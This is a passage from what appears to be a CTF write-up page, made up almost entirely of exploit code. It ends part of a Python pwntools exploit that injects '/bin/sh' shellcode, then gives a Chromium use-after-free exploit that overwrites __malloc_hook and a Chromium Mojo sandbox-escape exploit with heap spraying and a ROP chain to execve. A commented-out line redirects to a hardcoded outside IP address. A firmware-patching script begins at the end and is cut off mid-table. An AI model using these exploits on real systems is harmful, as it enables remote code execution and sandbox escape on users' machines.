        <span class="hljs-attribute">fmt</span> = fmt<span class="hljs-number">2</span>
    <span class="hljs-attribute">elif</span> total &lt; <span class="hljs-number">17</span>:
        <span class="hljs-attribute">fmt</span> = fmt<span class="hljs-number">3</span>
    <span class="hljs-attribute">elif</span> total &lt; <span class="hljs-number">22</span>:
        <span class="hljs-attribute">fmt</span> = fmt<span class="hljs-number">4</span>
    <span class="hljs-attribute">elif</span> total &lt; <span class="hljs-number">27</span>:
        <span class="hljs-attribute">fmt</span> = fmt<span class="hljs-number">5</span>
    <span class="hljs-attribute">elif</span> total &lt;= <span class="hljs-number">32</span>:
        <span class="hljs-attribute">fmt</span> = fmt<span class="hljs-number">6</span>  

    <span class="hljs-attribute">fmt</span> = fmt[::-<span class="hljs-number">1</span>]
    <span class="hljs-attribute">abin</span> = abin[::-<span class="hljs-number">1</span>]
    <span class="hljs-attribute">final</span> = &#x27;&#x27;
    <span class="hljs-attribute">i</span> = <span class="hljs-number">0</span>
    <span class="hljs-attribute">for</span> val in fmt:
        <span class="hljs-attribute">if</span> i != total:
            <span class="hljs-attribute">if</span> val == &#x27;x&#x27;:
                <span class="hljs-attribute">final</span> += abin[i]
                <span class="hljs-attribute">i</span> += <span class="hljs-number">1</span>
            <span class="hljs-attribute">else</span> :
                <span class="hljs-attribute">final</span> += val
        <span class="hljs-attribute">else</span> :
            <span class="hljs-attribute">if</span> val == &#x27;x&#x27;:
                <span class="hljs-attribute">final</span> += &#x27;<span class="hljs-number">0</span>&#x27;
            <span class="hljs-attribute">else</span> :
                <span class="hljs-attribute">final</span> += val
    <span class="hljs-attribute">final</span> = int(final[::-<span class="hljs-number">1</span>], <span class="hljs-number">2</span>)
    <span class="hljs-attribute">if</span> final == <span class="hljs-number">0</span>:
        <span class="hljs-attribute">return</span> &#x27;\x<span class="hljs-number">00</span>&#x27;
    <span class="hljs-attribute">else</span> :
        <span class="hljs-attribute">return</span> p<span class="hljs-number">64</span>(final)[::-<span class="hljs-number">1</span>].strip(&#x27;\x<span class="hljs-number">00</span>&#x27;)
        
<span class="hljs-attribute">addrlist</span> =<span class="hljs-meta"> []</span>
<span class="hljs-attribute">for</span> x in xrange(<span class="hljs-number">25</span>):
    <span class="hljs-attribute">addr</span> = Add()
    <span class="hljs-attribute">if</span> <span class="hljs-number">0</span>x<span class="hljs-number">8000</span> == addr:
        <span class="hljs-attribute">addrlist</span>.append(addr)
        <span class="hljs-attribute">break</span>
    <span class="hljs-attribute">else</span>:
        <span class="hljs-attribute">addrlist</span>.append(addr)

<span class="hljs-attribute">for</span> x in addrlist:
    <span class="hljs-attribute">log</span>.info(hex(x))

<span class="hljs-attribute">payload</span> = <span class="hljs-number">16</span>*unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>)
<span class="hljs-attribute">payload</span> += unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>x<span class="hljs-number">8500</span>)
<span class="hljs-attribute">payload</span> += unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>x<span class="hljs-number">0</span>)
<span class="hljs-attribute">payload</span> += <span class="hljs-number">12</span>*unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>)

<span class="hljs-attribute">payload</span> += unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>x<span class="hljs-number">206</span>)
<span class="hljs-attribute">payload</span> += unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>)
<span class="hljs-attribute">payload</span> += unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>x<span class="hljs-number">8088</span>)
<span class="hljs-attribute">payload</span> += unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>x<span class="hljs-number">0</span>)
<span class="hljs-attribute">payload</span> += unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>x<span class="hljs-number">8090</span>)
<span class="hljs-attribute">payload</span> += unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>x<span class="hljs-number">0</span>)


<span class="hljs-attribute">payload</span> += unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>x<span class="hljs-number">003</span>bb<span class="hljs-number">866</span>)
<span class="hljs-attribute">payload</span> += unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>x<span class="hljs-number">000009</span>e<span class="hljs-number">8</span>)
<span class="hljs-attribute">payload</span> += unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>x<span class="hljs-number">69622</span>f<span class="hljs-number">00</span>)
<span class="hljs-attribute">payload</span> += unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>x<span class="hljs-number">68732</span>f<span class="hljs-number">6</span>e)
<span class="hljs-attribute">payload</span> += unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>x<span class="hljs-number">6</span>a<span class="hljs-number">5</span>f<span class="hljs-number">0000</span>)
<span class="hljs-attribute">payload</span> += unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>x<span class="hljs-number">006</span>a<span class="hljs-number">5</span>e<span class="hljs-number">00</span>)
<span class="hljs-attribute">payload</span> += unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>x<span class="hljs-number">050</span>f<span class="hljs-number">5</span>a)

<span class="hljs-attribute">payload</span> += <span class="hljs-number">200</span>*u&#x27;\U<span class="hljs-number">0000</span>e<span class="hljs-number">431</span>&#x27;.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)
<span class="hljs-attribute">Edit</span>(payload)

<span class="hljs-attribute">irt</span>()</code></pre><h3 id="chromium-rce"><a class="header-link" href="#chromium-rce"></a>chromium rce</h3>
<pre class="hljs"><code><span class="hljs-keyword">const</span> hex = <span class="hljs-function">(<span class="hljs-params">x</span>) =&gt;</span> (<span class="hljs-string">&quot;0x&quot;</span> + x.toString(<span class="hljs-number">16</span>));
<span class="hljs-keyword">const</span> print = <span class="hljs-built_in">console</span>.log
<span class="hljs-keyword">const</span> arr1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x800</span>));
<span class="hljs-keyword">const</span> arr2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x800</span>));
%ArrayBufferDetach(arr1.buffer);
arr2.set(arr1); <span class="hljs-comment">// leak;</span>
<span class="hljs-keyword">const</span> libcAddr = arr2[<span class="hljs-number">2</span>] + arr2[<span class="hljs-number">3</span>] * <span class="hljs-number">0x100000000</span> - <span class="hljs-number">0x3ebca0</span>
print(hex(libcAddr));


<span class="hljs-keyword">const</span> abs = [];
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) {
    abs.push(<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x60</span>));
}

<span class="hljs-keyword">const</span> arr3 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x60</span>));
<span class="hljs-keyword">const</span> arr4 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x60</span>));
<span class="hljs-keyword">const</span> mallocHook = libcAddr + <span class="hljs-number">0x3ebc30</span> - <span class="hljs-number">0x23</span>;
arr4[<span class="hljs-number">0</span>] = mallocHook % <span class="hljs-number">0x100000000</span>;
arr4[<span class="hljs-number">1</span>] = (mallocHook - arr4[<span class="hljs-number">0</span>]) / <span class="hljs-number">0x100000000</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) {
    %ArrayBufferDetach(abs[i]);
}
%ArrayBufferDetach(arr3.buffer);

arr3.set(arr4);
<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x60</span>);
<span class="hljs-keyword">const</span> hookWriter = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x60</span>));
<span class="hljs-keyword">let</span> oneGadget = libcAddr + <span class="hljs-number">0x10a38c</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) {
    <span class="hljs-keyword">const</span> t = oneGadget % <span class="hljs-number">0x100</span>;
    hookWriter[<span class="hljs-number">0x13</span> + i] = t;
    oneGadget = (oneGadget - t) / <span class="hljs-number">0x100</span>;
}
<span class="hljs-comment">// hookWriter.fill(0x41, 0x13, 0x13 + 8);</span>
<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0</span>);</code></pre><h3 id="chromium-sbx"><a class="header-link" href="#chromium-sbx"></a>Chromium SBX</h3>
<pre class="hljs"><code><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/mojo_bindings.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/third_party/blink/public/mojom/tstorage/tstorage.mojom.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">const</span> hex = <span class="hljs-function">(<span class="hljs-params">x</span>) =&gt;</span> (<span class="hljs-string">&quot;0x&quot;</span> + x.toString(<span class="hljs-number">16</span>));
<span class="hljs-keyword">const</span> print = <span class="hljs-built_in">console</span>.log;
<span class="hljs-keyword">const</span> refs = [];
<span class="hljs-keyword">const</span> tInsPtrSprays = [];
<span class="hljs-keyword">const</span> tInsPtrSprays2 = [];
<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createSprayObjects</span>(<span class="hljs-params">tInsPtrSprays</span>)
</span>{
    <span class="hljs-keyword">const</span> tStrPtrSpray = <span class="hljs-keyword">new</span> blink.mojom.TStoragePtr();
    Mojo.bindInterface(blink.mojom.TStorage.name,
        mojo.makeRequest(tStrPtrSpray).handle, <span class="hljs-string">&#x27;context&#x27;</span>, <span class="hljs-literal">true</span>);
    <span class="hljs-keyword">await</span> tStrPtrSpray.init();
    <span class="hljs-keyword">const</span> tInsPtr = (<span class="hljs-keyword">await</span> tStrPtrSpray.createInstance()).instance;
    tInsPtrSprays.push(tInsPtr);
    refs.push(tStrPtrSpray);
}

<span class="hljs-comment">// 10 -&gt; True, True, True, True, True, True, True, True, True, True, True, False, True, True, False, True, True, False, True, True, True, True, True, True,</span>
<span class="hljs-comment">// 12 15 18 22 27 33 41 51 63 78 97 60 75 93 57 71 88 55 68 85 106 132 165 206</span>

<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sprayQueue</span>(<span class="hljs-params">tInsPtrSprays, val=<span class="hljs-number">0x41414141</span></span>)
</span>{
    <span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> tInsPtr <span class="hljs-keyword">of</span> tInsPtrSprays)
    {
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">97</span>; i++)
            <span class="hljs-keyword">await</span> tInsPtr.push(val);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">49</span>; i++)
            <span class="hljs-keyword">await</span> tInsPtr.pop();
        <span class="hljs-comment">// current capacity: 60, current size: 48</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">93</span> - <span class="hljs-number">48</span>; i++)
            <span class="hljs-keyword">await</span> tInsPtr.push(val);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">47</span>; i++)
            <span class="hljs-keyword">await</span> tInsPtr.pop();
        <span class="hljs-comment">// current capacity: 57, current size: 46</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">88</span> - <span class="hljs-number">46</span>; i++)
            <span class="hljs-keyword">await</span> tInsPtr.push(val);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">44</span>; i++)
            <span class="hljs-keyword">await</span> tInsPtr.pop();
        <span class="hljs-comment">// current capacity: 55, current size: 44</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">206</span> - <span class="hljs-number">44</span> - <span class="hljs-number">1</span>; i++)
            <span class="hljs-keyword">await</span> tInsPtr.push(<span class="hljs-number">0</span>);
        <span class="hljs-keyword">await</span> tInsPtr.push(i);
        <span class="hljs-comment">// int_value_</span>
        i++;

        <span class="hljs-comment">// console.log(await tInsPtr.getTotalSize());</span>
    }
}

<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>)
</span>{
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)
{
    <span class="hljs-keyword">await</span> createSprayObjects(tInsPtrSprays);
    <span class="hljs-keyword">await</span> createSprayObjects(tInsPtrSprays2);
}
print(<span class="hljs-string">&quot;spray init done&quot;</span>);

<span class="hljs-keyword">const</span> tStrPtr = <span class="hljs-keyword">new</span> blink.mojom.TStoragePtr();
Mojo.bindInterface(blink.mojom.TStorage.name,
    mojo.makeRequest(tStrPtr).handle,
    <span class="hljs-string">&#x27;context&#x27;</span>, <span class="hljs-literal">true</span>);
<span class="hljs-keyword">await</span> tStrPtr.init();
<span class="hljs-keyword">const</span> tInsPtr = (<span class="hljs-keyword">await</span> tStrPtr.createInstance()).instance;
<span class="hljs-keyword">await</span> tStrPtr.init();

print(<span class="hljs-string">&quot;UAF done&quot;</span>);
<span class="hljs-keyword">await</span> sprayQueue(tInsPtrSprays);
print(<span class="hljs-string">&quot;spray done&quot;</span>);
<span class="hljs-comment">// for (let i = 0; i &lt; uafs.length; i++)</span>
<span class="hljs-comment">//  print(hex((await uafs[i].get(2)).value));</span>
<span class="hljs-comment">// for (let i = 0; i &lt; 0x100; i++) {</span>
<span class="hljs-comment">//  await uafs[i].setInt(0x13372019 + i);</span>
<span class="hljs-comment">// }</span>
<span class="hljs-comment">// for (let i = 0; i &lt; uafs.length; i++)</span>
<span class="hljs-comment">//  print(hex((await uafs[i].getInt()).value));</span>
<span class="hljs-keyword">const</span> libcAddr = (<span class="hljs-keyword">await</span> tStrPtr.getLibcAddress()).addr - <span class="hljs-number">0x40680</span>;
<span class="hljs-keyword">const</span> textAddr = (<span class="hljs-keyword">await</span> tStrPtr.getTextAddress()).addr - <span class="hljs-number">0x39b5e60</span>;

<span class="hljs-comment">// rop and fake virtual table</span>
<span class="hljs-comment">// 0xd1ba7: lea rdi, [rsp + 0xb0]; mov rsi, rbp; call rbx</span>
<span class="hljs-comment">// 0x52bc8: pop rbp; pop rbx; ret;</span>
<span class="hljs-comment">// 0x2cb49: pop rbx; ret;</span>
<span class="hljs-comment">// 0x1b96: pop rdx; ret;</span>
<span class="hljs-comment">// 0x439c8: pop rax; ret;</span>
<span class="hljs-keyword">await</span> tInsPtr.push(libcAddr + <span class="hljs-number">0x52bc8</span>); <span class="hljs-comment">// begin of ROP</span>
<span class="hljs-keyword">await</span> tInsPtr.push(<span class="hljs-number">0</span>); <span class="hljs-comment">// let queue to have some element</span>
<span class="hljs-keyword">await</span> tInsPtr.push(textAddr + <span class="hljs-number">0x3fa5114</span>); <span class="hljs-comment">// xchg rsp,rax, as virtual table</span>
<span class="hljs-keyword">await</span> tInsPtr.push(libcAddr + <span class="hljs-number">0x2cb49</span>);
<span class="hljs-keyword">await</span> tInsPtr.push(libcAddr + <span class="hljs-number">0xe4e30</span>); <span class="hljs-comment">// execve</span>

<span class="hljs-keyword">await</span> tInsPtr.push(libcAddr + <span class="hljs-number">0x1b96</span>);
<span class="hljs-keyword">await</span> tInsPtr.push(<span class="hljs-number">0</span>); <span class="hljs-comment">// rdx = 0</span>

<span class="hljs-keyword">await</span> tInsPtr.push(libcAddr + <span class="hljs-number">0xd1ba7</span>);


<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++) {
    <span class="hljs-keyword">await</span> tInsPtr.push([<span class="hljs-number">0x6c662f2e</span>, <span class="hljs-number">0x705f6761</span>]);
    <span class="hljs-keyword">await</span> tInsPtr.push(<span class="hljs-number">0x7265746e6972</span>)
}

<span class="hljs-keyword">const</span> idx = (<span class="hljs-keyword">await</span> tInsPtr.getInt()).value;
print(idx);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">201</span>; i++)
    <span class="hljs-keyword">await</span> tInsPtrSprays[idx].pop();
<span class="hljs-keyword">const</span> heapAddr = (<span class="hljs-keyword">await</span> tInsPtrSprays[idx].pop()).value;
<span class="hljs-comment">// pop element to leak the address of heap</span>
<span class="hljs-comment">// now 0x678 is freed again due to poping elements</span>
print(hex(heapAddr));

<span class="hljs-keyword">await</span> sprayQueue(tInsPtrSprays2, heapAddr);
print(hex(libcAddr))
print(hex(textAddr));

<span class="hljs-keyword">await</span> tInsPtr.getTotalSize();
}
main();

<span class="hljs-comment">//</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-comment">&lt;!-- &lt;script&gt;window.location = &quot;http://192.144.212.163:8000/dajbnkcnamlskdm.html&quot;&lt;/script&gt; --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><h3 id="flash-1"><a class="header-link" href="#flash-1"></a>flash-1</h3>
<pre class="hljs"><code>from struct import pack

buf = open(<span class="hljs-string">&#x27;flash&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()

tbl = {
<span class="hljs-number">0x800005a0</span>: <span class="hljs-number">0x80002920</span>,
<span class="hljs-number">0x800005b0</span>: <span class="hljs-number">0x80002934</span>,
<span class="hljs-number">0x800005cc</span>: <span class="hljs-number">0x80002948</span>,
<span class="hljs-number">0x800005ec</span>: <span class="hljs-number">0x8000295c</span>,
<span class="hljs-number">0x80000610</span>: <span class="hljs-number">0x80002970</span>,
<span class="hljs-number">0x80000620</span>: <span class="hljs-number">0x80002984</span>,
<span class="hljs-number">0x80000630</span>: <span class="hljs-number">0x80002998</span>,
<span class="hljs-number">0x80000648</span>: <span class="hljs-number">0x800029ac</span>,
<span class="hljs-number">0x80000660</span>: <span class="hljs-number">0x800029c0</span>,
<span class="hljs-number">0x80000670</span>: <span class="hljs-number">0x800029d4</span>,
<span class="hljs-number">0x80000690</span>: <span class="hljs-number">0x800029e8</span>,
<span class="hljs-number">0x800006bc</span>: <span class="hljs-number">0x800029fc</span>,
<span class="hljs-number">0x800006cc</span>: <span class="hljs-number">0x80002a10</span>,
<span class="hljs-number">0x800006e0</span>: <span class="hljs-number">0x80002a24</span>,
<span class="hljs-number">0x80000700</span>: <span class="hljs-number">0x80002a38</span>,
<span class="hljs-number">0x80000738</span>: <span class="hljs-number">0x80002a4c</span>,
<span class="hljs-number">0x80000748</span>: <span class="hljs-number">0x80002a60</span>,
<span class="hljs-number">0x8000078c</span>: <span class="hljs-number">0x80002a74</span>,
<span class="hljs-number">0x800007c8</span>: <span class="hljs-number">0x80002a88</span>,
<span class="hljs-number">0x80000814</span>: <span class="hljs-number">0x80002a9c</span>,
<span class="hljs-number">0x80000834</span>: <span class="hljs-number">0x80002ab0</span>,
<span class="hljs-number">0x80000878</span>: <span class="hljs-number">0x80002ac4</span>,
<span class="hljs-number">0x80000898</span>: <span class="hljs-number">0x80002ad8</span>,
<span class="hljs-number">0x800008a4</span>: <span class="hljs-number">0x80002aec</span>,
<span class="hljs-number">0x800008b4</span>: <span class="hljs-number">0x80002b00</span>,
<span class="hljs-number">0x800008d8</span>: <span class="hljs-number">0x80002b14</span>,
<span class="hljs-number">0x800008e4</span>: <span class="hljs-number">0x80002b28</span>,
<span class="hljs-number">0x800008f0</span>: <span class="hljs-number">0x80002b3c</span>,
<span class="hljs-number">0x80000900</span>: <span class="hljs-number">0x80002b50</span>,
<span class="hljs-number">0x80000924</span>: <span class="hljs-number">0x80002b64</span>,
<span class="hljs-number">0x80000930</span>: <span class="hljs-number">0x80002b78</span>,
<span class="hljs-number">0x8000093c</span>: <span class="hljs-number">0x80002b8c</span>,
<span class="hljs-number">0x8000094c</span>: <span class="hljs-number">0x80002ba0</span>,
<span class="hljs-number">0x80000978</span>: <span class="hljs-number">0x80002bb4</span>,
<span class="hljs-number">0x80000984</span>: <span class="hljs-number">0x80002bc8</span>,
<span class="hljs-number">0x800009b8</span>: <span class="hljs-number">0x80002bdc</span>,
<span class="hljs-number">0x800009c4</span>: <span class="hljs-number">0x80002bf0</span>,
<span class="hljs-number">0x800009d0</span>: <span class="hljs-number">0x80002c04</span>,
<span class="hljs-number">0x800009e0</span>: <span class="hljs-number">0x80002c18</span>,
<span class="hljs-number">0x80000a08</span>: <span class="hljs-number">0x80002c2c</span>,
<span class="hljs-number">0x80000a14</span>: <span class="hljs-number">0x80002c40</span>,
<span class="hljs-number">0x80000a20</span>: <span class="hljs-number">0x80002c54</span>,
<span class="hljs-number">0x80000a30</span>: <span class="hljs-number">0x80002c68</span>,
<span class="hljs-number">0x80000a5c</span>: <span class="hljs-number">0x80002c7c</span>,
<span class="hljs-number">0x80000a68</span>: <span class="hljs-number">0x80002c90</span>,
<span class="hljs-number">0x80000aa4</span>: <span class="hljs-number">0x80002ca4</span>,
<span class="hljs-number">0x80000ab8</span>: <span class="hljs-number">0x80002cb8</span>,
<span class="hljs-number">0x80000af4</span>: <span class="hljs-number">0x80002ccc</span>,
<span class="hljs-number">0x80000b30</span>: <span class="hljs-number">0x80002ce0</span>,
<span class="hljs-number">0x80000b44</span>: <span class="hljs-number">0x80002cf4</span>,
<span class="hljs-number">0x80000b80</span>: <span class="hljs-number">0x80002d08</span>,
<span class="hljs-number">0x80000ba0</span>: <span class="hljs-number">0x80002d1c</span>,
<span class="hljs-number">0x80000bc8</span>: <span class="hljs-number">0x80002d30</span>,
<span class="hljs-number">0x80000c0c</span>: <span class="hljs-number">0x80002d44</span>,
<span class="hljs-number">0x80000c18</span>: <span class="hljs-number">0x80002d58</span>,
<span class="hljs-number">0x80000c34</span>: <span class="hljs-number">0x80002d6c</span>,
<span class="hljs-number">0x80000c40</span>: <span class="hljs-number">0x80002d80</span>,
<span class="hljs-number">0x80000c4c</span>: <span class="hljs-number">0x80002d94</span>,
<span class="hljs-number">0x80000c64</span>: <span class="hljs-number">0x80002da8</span>,
<span class="hljs-number">0x80000c70</span>: <span class="hljs-number">0x80002dbc</span>,
<span class="hljs-number">0x80000c7c</span>: <span class="hljs-number">0x80002dd0</span>,
<span class="hljs-number">0x80000c90</span>: <span class="hljs-number">0x80002de4</span>,
<span class="hljs-number">0x80000ca4</span>: <span class="hljs-number">0x80002df8</span>,
<span class="hljs-number">0x80000cc8</span>: <span class="hljs-number">0x80002e0c</span>,
<span class="hljs-number">0x80000d2c</span>: <span class="hljs-number">0x80002e20</span>,
<span class="hljs-number">0x80000d50</span>: <span class="hljs-number">0x80002e34</span>,
<span class="hljs-number">0x80000d64</span>: <span class="hljs-number">0x80002e48</span>,
<span class="hljs-number">0x80000d74</span>: <span class="hljs-number">0x80002e5c</span>,
<span class="hljs-number">0x80000d8c</span>: <span class="hljs-number">0x80002e70</span>,
<span class="hljs-number">0x80000db8</span>: <span class="hljs-number">0x80002e84</span>,
<span class="hljs-number">0x80000dc4</span>: <span class="hljs-number">0x80002e98</span>,
<span class="hljs-number">0x80000de8</span>: <span class="hljs-number">0x80002eac</span>,
<span class="hljs-number">0x80000e18</span>: <span class="hljs-number">0x80002ec0</span>,
<span class="hljs-number">0x80000e50</span>: <span class="hljs-number">0x80002ed4</span>,
<span class="hljs-number">0x80000e5c</span>: <span class="hljs-number">0x80002ee8</span>,
<span class="hljs-number">0x80000e70</span>: <span class="hljs-number">0x80002efc</span>,
<span class="hljs-number">0x80000e84</span>: <span class="hljs-number">0x80002f10</span>,
<span class="hljs-number">0x80000e90</span>: <span class="hljs-number">0x80002f24</span>,
<span class="hljs-number">0x80000ea0</span>: <span class="hljs-number">0x80002f38</span>,
<span class="hljs-number">0x80000eb8</span>: <span class="hljs-number">0x80002f4c</span>,
<span class="hljs-number">0x80000ed8</span>: <span class="hljs-number">0x80002f60</span>,
<span class="hljs-number">0x80000f08</span>: <span class="hljs-number">0x80002f74</span>,
<span class="hljs-number">0x80000f3c</span>: <span class="hljs-number">0x80002f88</span>,
<span class="hljs-number">0x80000f78</span>: <span class="hljs-number">0x80002f9c</span>,
<span class="hljs-number">0x80000fcc</span>: <span class="hljs-number">0x80002fb0</span>,
<span class="hljs-number">0x80001014</span>: <span class="hljs-number">0x80002fc4</span>,
<span class="hljs-number">0x80001098</span>: <span class="hljs-number">0x80002fd8</span>,
<span class="hljs-number">0x800010d8</span>: <span class="hljs-number">0x80002fec</span>,
<span class="hljs-number">0x800010f8</span>: <span class="hljs-number">0x80003000</span>,
<span class="hljs-number">0x80001118</span>: <span class="hljs-number">0x80003014</span>,
<span class="hljs-number">0x8000112c</span>: <span class="hljs-number">0x80003028</span>,
<span class="hljs-number">0x80001150</span>: <span class="hljs-number">0x8000303c</span>,
<span class="hljs-number">0x80001178</span>: <span class="hljs-number">0x80003050</span>,
<span class="hljs-number">0x80001198</span>: <span class="hljs-number">0x80003064</span>,
<span class="hljs-number">0x800011bc</span>: <span class="hljs-number">0x80003078</span>,
<span class="hljs-number">0x800011dc</span>: <span class="hljs-number">0x8000308c</span>,
<span class="hljs-number">0x80001204</span>: <span class="hljs-number">0x800030a0</span>,
<span class="hljs-number">0x80001238</span>: <span class="hljs-number">0x800030b4</span>,
<span class="hljs-number">0x80001248</span>: <span class="hljs-number">0x800030c8</span>,
<span class="hljs-number">0x80001278</span>: <span class="hljs-number">0x800030dc</span>,
<span class="hljs-number">0x800012b4</span>: <span class="hljs-number">0x800030f0</span>,
<span class="hljs-number">0x800012dc</span>: <span class="hljs-number">0x80003104</span>,
<span class="hljs-number">0x80001310</span>: <span class="hljs-number">0x80003118</span>,
<span class="hljs-number">0x80001320</span>: <span class="hljs-number">0x8000312c</span>,
<span class="hljs-number">0x8000134c</span>: <span class="hljs-number">0x80003140</span>,
<span class="hljs-number">0x80001384</span>: <span class="hljs-number">0x80003154</span>,
<span class="hljs-number">0x800013c4</span>: <span class="hljs-number">0x80003168</span>,
<span class="hljs-number">0x800013d4</span>: <span class="hljs-number">0x8000317c</span>,
<span class="hljs-number">0x800013e8</span>: <span class="hljs-number">0x80003190</span>,
<span class="hljs-number">0x8000140c</span>: <span class="hljs-number">0x800031a4</span>,
<span class="hljs-number">0x80001420</span>: <span class="hljs-number">0x800031b8</span>,
<span class="hljs-number">0x80001444</span>: <span class="hljs-number">0x800031cc</span>,
<span class="hljs-number">0x80001474</span>: <span class="hljs-number">0x800031e0</span>,
<span class="hljs-number">0x800014a4</span>: <span class="hljs-number">0x800031f4</span>,
<span class="hljs-number">0x800014b0</span>: <span class="hljs-number">0x80003208</span>,
<span class="hljs-number">0x800014c8</span>: <span class="hljs-number">0x8000321c</span>,
<span class="hljs-number">0x800014e4</span>: <span class="hljs-number">0x80003230</span>,
<span class="hljs-number">0x80001514</span>: <span class="hljs-number">0x80003244</span>,
<span class="hljs-number">0x80001534</span>: <span class="hljs-number">0x80003258</span>,
<span class="hljs-number">0x8000157c</span>: <span class="hljs-number">0x8000326c</span>,
<span class="hljs-number">0x8000159c</span>: <span class="hljs-number">0x80003280</span>,
<span class="hljs-number">0x800015d0</span>: <span class="hljs-number">0x80003294</span>,
<span class="hljs-number">0x800015dc</span>: <span class="hljs-number">0x800032a8</span>,
<span class="hljs-number">0x800015f4</span>: <span class="hljs-number">0x800032bc</span>,
<span class="hljs-number">0x80001618</span>: <span class="hljs-number">0x800032d0</span>,
